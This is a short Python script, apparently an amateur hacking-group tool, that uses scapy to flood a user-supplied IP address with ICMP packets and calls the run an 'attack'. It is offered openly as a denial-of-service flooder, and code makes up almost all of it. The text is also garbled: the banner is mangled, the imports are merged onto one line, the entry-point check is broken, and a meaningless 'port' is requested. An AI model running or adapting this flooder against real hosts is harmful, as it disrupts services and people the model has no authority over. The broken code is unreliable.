import os import sys import random import time from scapy.all import IP, ICMP, send

def icmp_flood(target_ip, port, packet_count): print(""" __________           .___
______   \ ____   | /
|       // __ \ / __ |
|    |   \  // // |
||  /__  >____ |
/     /     /
____   ____      .__   __   .__       .__
\   \ /   /____  |  | |  | ||||___
\   Y   /__  \ |  | |  |/ /  _  __ \  __  \
\     /  / __ |  ||    <|  ||  | /  |/ __ _
___/  (___  //__| _|||  |(__  / /          /                 / --------------------------------- | Make by Jhon | Equipe Família Spamer | --------------------------------- """)

for _ in range(packet_count):
    packet = IP(dst=target_ip)/ICMP()
    send(packet, verbose=False)
    print(f"[+] Pacote enviado para {target_ip}:{port}")
    time.sleep(0.1)

print("[+] Ataque ICMP concluído!")

if name == "main": target_ip = input("IP do site: ") port = input("Porta do site: ") packet_count = int(input("Quantidade de packets: "))

icmp_flood(target_ip, port, packet_count)

